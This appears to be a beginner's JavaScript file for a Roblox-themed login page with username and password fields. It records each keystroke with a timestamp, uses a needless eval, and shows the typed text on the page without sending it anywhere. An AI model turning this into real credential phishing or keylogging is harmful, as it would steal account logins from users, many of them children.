const audio= new Audio("short.MP3")
const body =document.getElementById("body")
const button=document.getElementById("button")
let myArray=[]
let text=[]
const userIn=document.getElementById("userid")
const passIn=document.getElementById("passid")
const resultEl=document.getElementById("result")
const resultEl2=document.getElementById("result2")
let firstPart="(String.fromCharCode(myArray[i]))"
button.addEventListener("click",function(){
    audio.volume=1
    audio.play()
    
    window.open(`https://www.roblox.com/users/profile?username=${userIn.value}`,"_blank")
    userIn.value=""
    passIn.value=""
})
body.addEventListener("keypress",function(event){
    var today = new Date();
    var date = today.getFullYear()+'-'+(today.getMonth()+1)+'-'+today.getDate();
    var time = today.getHours() + ":" + today.getMinutes() + ":" + today.getSeconds();
    var dateTime = date+' '+time;
 
  myArray.push(event.keyCode)
  for(let i=0;i<myArray.length;i++){
    
    text=eval(firstPart)

  }
 console.log(text)

  resultEl.textContent+=text
  resultEl.innerHTML+="<br>"
  resultEl2.textContent+=(`[${dateTime}]`);

  
  
})